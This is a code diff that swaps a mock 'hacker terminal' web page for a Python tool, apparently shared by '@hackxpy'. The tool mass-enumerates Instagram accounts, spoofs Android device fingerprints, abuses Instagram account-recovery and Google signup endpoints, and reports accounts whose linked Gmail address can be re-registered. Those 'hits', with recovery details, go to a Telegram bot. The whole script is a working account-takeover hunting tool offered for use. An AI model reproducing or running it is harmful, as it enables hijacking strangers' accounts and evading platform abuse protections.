@@ -1,55 +1,456 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Terminal</title>
-    <style>
-        body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            padding: 20px;
-            overflow: hidden;
-            height: 100vh;
-        }
-        #terminal {
-            font-size: 1.2rem;
-            line-height: 1.5;
-        }
-        .cursor {
-            animation: blink 1s infinite;
-        }
-        @keyframes blink { 50% { opacity: 0; } }
-    </style>
-</head>
-<body>
-    <div id="terminal">
-        <p>INITIALIZING SYSTEM SEQUENCE...</p>
-        <p id="output"></p>
-        <span class="cursor">_</span>
-    </div>
+import re, sys, json, uuid, time, random, secrets, string, threading, base64, os
+from concurrent.futures import ThreadPoolExecutor
+import requests
+from bs4 import BeautifulSoup
 
-    <script>
-        const output = document.getElementById('output');
-        const commands = [
-            "ACCESSING ROOT DIRECTORY...",
-            "BYPASSING FIREWALLS...",
-            "ESTABLISHING SECURE CONNECTION...",
-            "SYSTEM ANALYSIS COMPLETE.",
-            "SIMULATION INTERFACE ACTIVE."
-        ];
-        
-        let i = 0;
-        function typeCommands() {
-            if (i < commands.length) {
-                output.innerHTML += commands[i] + "<br>";
-                i++;
-                setTimeout(typeCommands, 1500);
-            }
+BOT_TOKEN = None
+CHAT_ID = None
+MIN_FOLLOW = 5
+RANGE_START = 1629010001
+RANGE_END = 2500000000
+WORKERS = 300
+CREDIT = "@foreshower | @hackxpy"
+
+found_users = set()
+seen_ids = set()
+hits = 0
+bad_ig = 0
+bad_mail = 0
+scanned = 0
+start = time.time()
+lock = threading.Lock()
+sess = requests.Session()
+ig_tokens = {"csrf": "", "lsd": ""}
+tok_lock = threading.Lock()
+g_tok = ["", ""]
+g_lock = threading.Lock()
+local_data = threading.local()
+
+W = "\033[1;37m"
+G = "\033[92m"
+Y = "\033[93m"
+R = "\033[91m"
+C = "\033[96m"
+B = "\033[94m"
+M = "\033[95m"
+RS = "\033[0m"
+YY = 'abcdefghijklmnopqrstuvwxyz'
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def get_tokens():
+    global ig_tokens
+    with tok_lock:
+        if ig_tokens.get("lsd"):
+            return True
+        try:
+            with open("tokens.txt") as f:
+                p = f.read().strip().split("|")
+                if len(p) == 2 and p[0] and p[1]:
+                    ig_tokens = {"csrf": p[0], "lsd": p[1]}
+                    return True
+        except:
+            pass
+        for url in ["https://www.instagram.com/", "https://www.instagram.com/accounts/login/"]:
+            for _ in range(2):
+                try:
+                    r = sess.get(url, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "x-ig-app-id": "936619743392459"}, timeout=10)
+                    c = r.cookies.get("csrftoken")
+                    m = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', r.text)
+                    if c and m:
+                        ig_tokens = {"csrf": c, "lsd": m.group(1)}
+                        with open("tokens.txt", "w") as f:
+                            f.write(f"{c}|{m.group(1)}")
+                        return True
+                except:
+                    pass
+        return False
+
+
+def tok_refresh():
+    while True:
+        time.sleep(300)
+        get_tokens()
+
+
+def dev_fp():
+    if not hasattr(local_data, "fp"):
+        d = random.choice([
+            {"brand": "samsung", "model": "SM-G973F", "dpi": "420", "w": "1080", "h": "2280"},
+            {"brand": "samsung", "model": "SM-A536B", "dpi": "450", "w": "1080", "h": "2400"},
+            {"brand": "samsung", "model": "SM-S918B", "dpi": "450", "w": "1440", "h": "3088"},
+            {"brand": "Google", "model": "Pixel 7", "dpi": "420", "w": "1080", "h": "2400"},
+            {"brand": "Xiaomi", "model": "M2102J20SG", "dpi": "440", "w": "1080", "h": "2400"},
+            {"brand": "OnePlus", "model": "ONEPLUS A6003", "dpi": "420", "w": "1080", "h": "2280"},
+            {"brand": "Nothing", "model": "A063", "dpi": "420", "w": "1080", "h": "2408"},
+        ])
+        local_data.fp = {
+            "dev_id": str(uuid.uuid4()),
+            "fam_id": str(uuid.uuid4()),
+            "and_id": "android-" + secrets.token_hex(8),
+            "ua": f"Instagram {random.randint(280,340)}.0.0.{random.randint(10,99)} Android ({random.choice(['11','12','13','14'])}; {d['dpi']}dpi; {d['w']}x{d['h']}; {d['brand']}; {d['model']}; en_US)",
+            "tz": str(random.choice([60, 330, 480, 570])),
         }
-        typeCommands();
-    </script>
-</body>
-</html>
+    return local_data.fp
+
+
+def est_year(uid):
+    try:
+        u = int(uid)
+        if u < 1279000: return 2010
+        if u < 17750000: return 2011
+        if u < 279760000: return 2012
+        if u < 900990000: return 2013
+        if u < 1629010000: return 2014
+        if u < 2500000000: return 2015
+        if u < 3713668786: return 2016
+        if u < 5699785217: return 2017
+        if u < 8507940634: return 2018
+        if u < 21254029834: return 2019
+        return "2020+"
+    except:
+        return "?"
+
+
+def fetch_user(uid):
+    if not get_tokens():
+        return {}
+    try:
+        r = sess.post(
+            "https://www.instagram.com/api/graphql",
+            data={"lsd": ig_tokens["lsd"], "variables": json.dumps({"userID": str(uid), "username": "cristiano"}), "doc_id": "7717269488336001"},
+            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Content-Type": "application/x-www-form-urlencoded", "x-ig-app-id": "936619743392459", "x-fb-lsd": ig_tokens["lsd"], "x-csrftoken": ig_tokens["csrf"], "origin": "https://www.instagram.com"},
+            timeout=10,
+        )
+        d = r.json().get("data", {}).get("user", {})
+        if d and d.get("username"):
+            return d
+    except:
+        pass
+    return {}
+
+
+def bloks_check(email):
+    fp = dev_fp()
+    try:
+        a = json.dumps({"aac_init_timestamp": int(time.time()), "aacjid": str(uuid.uuid4()), "aaccs": secrets.token_urlsafe(32)})
+        p = json.dumps({
+            "client_input_params": {
+                "aac": a,
+                "flash_call_permissions_status": {"READ_PHONE_STATE": "PERMANENTLY_DENIED", "READ_CALL_LOG": "DENIED", "ANSWER_PHONE_CALLS": "DENIED"},
+                "was_headers_prefill_available": 0, "network_bssid": None, "sfdid": "",
+                "fetched_email_token_list": {}, "search_query": email,
+                "auth_secure_device_id": "", "ig_oauth_token": [], "cloud_trust_token": None,
+                "was_headers_prefill_used": 0, "sso_accounts_auth_data": [],
+                "encrypted_msisdn": "", "device_network_info": None,
+                "text_input_id": "akyuf0:61", "zero_balance_state": None,
+                "android_build_type": "release", "accounts_list": [],
+                "is_oauth_without_permission": 0,
+                "ig_android_qe_device_id": fp["dev_id"],
+                "gms_incoming_call_retriever_eligibility": "client_not_supported",
+                "search_screen_type": "email_or_username",
+                "is_whatsapp_installed": 1,
+                "lois_settings": {"lois_token": ""},
+                "ig_vetted_device_nonce": None, "headers_infra_flow_id": "",
+                "fetched_email_list": [],
+            },
+            "server_params": {
+                "event_request_id": str(uuid.uuid4()), "is_from_logged_out": 0,
+                "layered_homepage_experiment_group": None,
+                "device_id": fp["and_id"], "login_surface": "login_home",
+                "waterfall_id": str(uuid.uuid4()),
+                "INTERNAL__latency_qpl_instance_id": 6.3987980400102E13,
+                "is_platform_login": 0, "context_data": "",
+                "login_entry_point": "logged_out",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "family_device_id": fp["fam_id"],
+                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
+                "access_flow_version": "pre_mt_behavior",
+                "is_from_logged_in_switcher": 0,
+                "qe_device_id": fp["dev_id"],
+            },
+        })
+        c = json.dumps({"bloks_version": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b", "styles_id": "instagram"})
+        r = requests.post(
+            "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
+            data={"params": p, "bk_client_context": c, "bloks_versioning_id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"},
+            headers={
+                "User-Agent": fp["ua"], "accept-language": "en-IN, en-US",
+                "x-bloks-version-id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+                "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+                "x-ig-android-id": fp["and_id"], "x-ig-app-id": "567067343352427",
+                "x-ig-app-locale": "en_IN", "x-ig-device-id": fp["dev_id"],
+                "x-ig-family-device-id": fp["fam_id"], "x-ig-timezone-offset": fp["tz"],
+                "x-mid": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
+                "x-pigeon-rawclienttime": str(time.time()),
+                "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-0",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            },
+            timeout=15,
+        )
+        return email in r.text
+    except:
+        return False
+
+
+def make_g_tok():
+    try:
+        n1 = "".join(random.choice(YY) for _ in range(random.randrange(6, 9)))
+        n2 = "".join(random.choice(YY) for _ in range(random.randrange(3, 9)))
+        ua = f"Mozilla/5.0 (Linux; Android {random.choice(['10','11','12','13','14'])}; K) AppleWebKit/537.36 Chrome/{random.randint(120,140)}.0.0.0 Mobile Safari/537.36"
+        r = requests.get(
+            "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB",
+            headers={"User-Agent": ua, "accept": "*/*", "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "google-accounts-xsrf": "1", "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"', "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"'},
+            timeout=8,
+        )
+        m = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', r.text)
+        if not m:
+            return
+        tv = m.group(2)
+        r = requests.post(
+            "https://accounts.google.com/_/signup/validatepersonaldetails",
+            cookies={"__Host-GAPS": "".join(random.choice(YY) for _ in range(random.randrange(15, 30)))},
+            headers={"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "google-accounts-xsrf": "1", "authority": "accounts.google.com", "origin": "https://accounts.google.com"},
+            data={"f.req": json.dumps([tv, n1, n2, n1, n2, 0, 0, None, None, "web-glif-signup", 0, None, 1, [], 1]), "deviceinfo": json.dumps([None, None, None, None, None, "NL", None, None, None, "GlifWebSignIn", None, [], None, None, None, None, 2, None, 0, 1, "", None, None, 2, 2])},
+            timeout=8,
+        )
+        parts = r.text.split('",null,"')
+        tl = parts[1].split('"')[0] if len(parts) > 1 else ""
+        host = r.cookies.get("__Host-GAPS", "")
+        if tl and host:
+            with g_lock:
+                g_tok[0] = tl
+                g_tok[1] = host
+    except:
+        pass
+
+
+def g_refresh():
+    while True:
+        make_g_tok()
+        time.sleep(random.uniform(10, 20))
+
+
+def check_mail(user):
+    for _ in range(5):
+        with g_lock:
+            tl, host = g_tok[0], g_tok[1]
+        if not tl or not host:
+            time.sleep(2)
+            continue
+        ua = f"Mozilla/5.0 (Linux; Android {random.choice(['10','11','12','13','14'])}; K) AppleWebKit/537.36 Chrome/{random.randint(120,140)}.0.0.0 Mobile Safari/537.36"
+        try:
+            r = requests.post(
+                "https://accounts.google.com/_/signup/usernameavailability",
+                params={"TL": tl},
+                cookies={"__Host-GAPS": host},
+                headers={
+                    "User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+                    "google-accounts-xsrf": "1", "authority": "accounts.google.com",
+                    "origin": "https://accounts.google.com",
+                    "referer": f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}",
+                },
+                data=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{user}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&",
+                timeout=8,
+            )
+            if '"gf.uar",1' in r.text:
+                return True
+            if '"er",null,null,null,null,400' in r.text:
+                time.sleep(1)
+                continue
+            return False
+        except:
+            time.sleep(1)
+            continue
+    return False
+
+
+def get_recovery(user):
+    for a in range(3):
+        try:
+            if not get_tokens():
+                raise Exception
+            r = sess.post(
+                "https://www.instagram.com/api/graphql",
+                data={"lsd": ig_tokens["lsd"], "variables": json.dumps({"params": {"event_request_id": str(uuid.uuid4()), "search_query": user, "waterfall_id": str(uuid.uuid4())}}), "doc_id": "26178667145161478"},
+                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Content-Type": "application/x-www-form-urlencoded", "x-ig-app-id": "936619743392459", "x-fb-lsd": ig_tokens["lsd"], "x-csrftoken": ig_tokens["csrf"], "origin": "https://www.instagram.com", "referer": "https://www.instagram.com/accounts/password/reset/"},
+                timeout=10,
+            )
+            pts = r.json().get("data", {}).get("caa_ar_ig_account_search", {}).get("contact_points", [])
+            email = next((p["contact_point"] for p in pts if p.get("type") == "EMAIL"), None)
+            if email:
+                return email
+        except:
+            time.sleep(1 * (a + 1))
+    m = user[0] + "*" * (len(user) - 2) + user[-1] if len(user) > 2 else user
+    return f"{m}@gmail.com"
+
+
+def send_hit(h):
+    msg = f"""
+┏━━━━━━━━━━━━━━━━━━━━━━━┓
+       ⚡ PREMIUM HIT ⚡
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+
+👨‍💻 USERNAME  » @{h['user']}
+📬 EMAIL     » {h['user']}@gmail.com
+🔒 RECOVERY  » {h['recovery']}
+
+📊 FOLLOWERS » {h['followers']}
+🔃 FOLLOWING » {h['following']}
+🖼️ POSTS     » {h['posts']}
+
+📅 CREATED   » {h['year']}
+
+🌎 instagram.com/{h['user']}
+
+┏━━━━━━━━━━━━━━━━━━━━━━━┓
+  🎖️ RESULT : VALID ACCOUNT
+  👑 {CREDIT}
+┗━━━━━━━━━━━━━━━━━━━━━━━┛"""
+    try:
+        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=10)
+    except:
+        with open("@hackxpy.txt", "a", encoding="utf-8") as f:
+            f.write(f"{msg}\n")
+
+def get_stats(user, g):
+    fol = "N/A"
+    fol2 = "N/A"
+    posts = "N/A"
+    try:
+        r = requests.get(
+            f"https://www.instagram.com/{user}/",
+            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
+            timeout=15,
+        )
+        soup = BeautifulSoup(r.text, "html.parser")
+        m = soup.find("meta", attrs={"name": "description"})
+        if m:
+            c = m.get("content", "")
+            mf = re.search(r"([\d,.]+[KkMmBb]?)\s*[Ff]ollowers?", c)
+            mg = re.search(r"([\d,.]+[KkMmBb]?)\s*[Ff]ollowing", c)
+            mp = re.search(r"([\d,.]+[KkMmBb]?)\s*[Pp]osts?", c)
+            if mf: fol = mf.group(1)
+            if mg: fol2 = mg.group(1)
+            if mp: posts = mp.group(1)
+    except:
+        pass
+    return fol, fol2, posts
+
+
+def worker():
+    global hits, bad_ig, bad_mail, scanned
+    while True:
+        uid = random.randint(RANGE_START, RANGE_END)
+        with lock:
+            if uid in seen_ids:
+                continue
+            seen_ids.add(uid)
+            scanned += 1
+        u = fetch_user(uid)
+        if not u:
+            continue
+        user = u.get("username", "")
+        fol = u.get("follower_count", 0)
+        if not user or "_" in user or fol < MIN_FOLLOW:
+            continue
+        with lock:
+            if user in found_users:
+                continue
+            found_users.add(user)
+        if not bloks_check(f"{user}@gmail.com"):
+            with lock:
+                bad_ig += 1
+            continue
+        if not check_mail(user):
+            with lock:
+                bad_mail += 1
+            continue
+        email = get_recovery(user)
+        fol, fol2, posts = get_stats(user, u)
+        send_hit({
+            "user": user,
+            "email": f"{user}@gmail.com",
+            "recovery": email,
+            "year": est_year(u.get("pk", 0)),
+            "followers": fol,
+            "following": fol2,
+            "posts": posts,
+        })
+        with lock:
+            hits += 1
+
+
+def draw():
+    while True:
+        with lock:
+            el = int(time.time() - start)
+            h, m, s = el // 3600, (el % 3600) // 60, el % 60
+            line = f"  {C}{h:02d}:{m:02d}:{s:02d}{RS}  {G}Hit{RS} {hits}  {R}Bad{RS} {bad_ig}  {Y}Mail{RS} {bad_mail}  {M}{CREDIT}{RS}"
+        sys.stdout.write("\r" + line + "\033[K")
+        sys.stdout.flush()
+        time.sleep(0.3)
+
+
+print(f"""
+{W}╔{'═' * 44}╗{RS}       
+{W}║{C}{'⚡ GMAIL TOOL ⚡'.center(44)}{W}║{RS}      
+{W}╠{'═' * 44}╣{RS}        
+{W}║{M}{'FREE VERSION'.center(44)}{W}║{RS}     
+{W}║{' ' * 44}║{RS}      
+{W}║{Y}{f'👑 {CREDIT}'.center(44)}{W}║{RS}      
+{W}╚{'═' * 44}╝{RS}      
+""")
+
+
+def main():
+    global BOT_TOKEN, CHAT_ID, MIN_FOLLOW, RANGE_START, RANGE_END
+
+    print(f"  {W}Bot Token{RS}{B}:{RS} ", end=""); sys.stdout.flush()
+    BOT_TOKEN = input().strip()
+    print(f"  {W}Chat ID{RS}{B}:{RS} ", end=""); sys.stdout.flush()
+    CHAT_ID = input().strip()
+
+    print(f"\n  {C}Account Year:{RS}")
+    print(f"  {W}[1]{RS} 2010   {W}[2]{RS} 2011   {W}[3]{RS} 2012   {W}[4]{RS} 2013   {W}[5]{RS} 2014")
+    print(f"  {W}[6]{RS} 2015   {W}[7]{RS} 2016   {W}[8]{RS} 2017   {W}[9]{RS} 2018   {W}[10]{RS} 2019   {W}[11]{RS} 2020+")
+    print(f"  {M}Default{RS}{B}:{RS} {W}[7]{RS}{B}:{RS} ", end="")
+    sys.stdout.flush()
+    c = input().strip()
+    rng = {
+        "1": (1, 1279000), "2": (1279001, 17750000), "3": (17750001, 279760000),
+        "4": (279760001, 900990000), "5": (900990001, 1629010000),
+        "6": (1629010001, 2500000000), "7": (2500000001, 3713668786),
+        "8": (3713668787, 5699785217), "9": (5699785218, 8507940634),
+        "10": (8507940635, 21254029834), "11": (21254029835, 40000000000),
+    }
+    if c in rng:
+        RANGE_START, RANGE_END = rng[c]
+
+    try:
+        MIN_FOLLOW = int(input(f"  {W}Min Followers{RS}{B}:{RS} ").strip() or "5")
+    except:
+        MIN_FOLLOW = 5
+    get_tokens()
+    clear()
+
+    threading.Thread(target=tok_refresh, daemon=True).start()
+    threading.Thread(target=g_refresh, daemon=True).start()
+    threading.Thread(target=draw, daemon=True).start()
+    pool = ThreadPoolExecutor(max_workers=WORKERS)
+    for _ in range(WORKERS):
+        pool.submit(worker)
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n\n  {R}Stopped.{RS}")
+        pool.shutdown(wait=False)
+
+
+if __name__ == "__main__":
+    main()
